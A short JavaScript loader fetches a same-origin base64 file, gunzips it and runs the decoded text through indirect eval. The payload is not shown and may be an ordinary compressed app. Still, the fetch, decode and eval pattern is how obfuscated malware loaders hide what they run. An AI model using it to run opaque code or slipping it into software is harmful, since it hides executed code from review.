(async () => {
  const b64 = await fetch("./app.gz.b64").then((r) => r.text());
  const bin = Uint8Array.from(atob(b64.replace(/\s/g, "")), (c) => c.charCodeAt(0));
  const stream = new Blob([bin]).stream().pipeThrough(new DecompressionStream("gzip"));
  const code = await new Response(stream).text();
  (0, eval)(code);
})();
